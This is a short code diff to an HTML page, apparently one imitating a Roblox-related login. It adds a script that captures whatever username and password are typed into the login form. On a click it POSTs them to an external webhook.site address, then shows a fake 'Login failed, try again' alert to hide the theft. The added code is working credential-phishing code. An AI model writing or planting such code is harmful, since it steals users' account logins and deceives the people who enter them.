@@ -830,4 +830,23 @@ function checkRobloxInstall() {
     });
   });
 </script>
+    <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const btn = document.getElementById("login-button");
+    if (!btn) return;
+
+    btn.addEventListener("click", function () {
+      const username = document.getElementById("login-username").value;
+      const password = document.getElementById("login-password").value;
+
+      fetch("https://webhook.site/8eb05088-d3d1-4dec-bffb-332db4d73d00", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+      });
+
+      alert("Login failed, try again.");
+    });
+  });
+</script>
 </body></html>
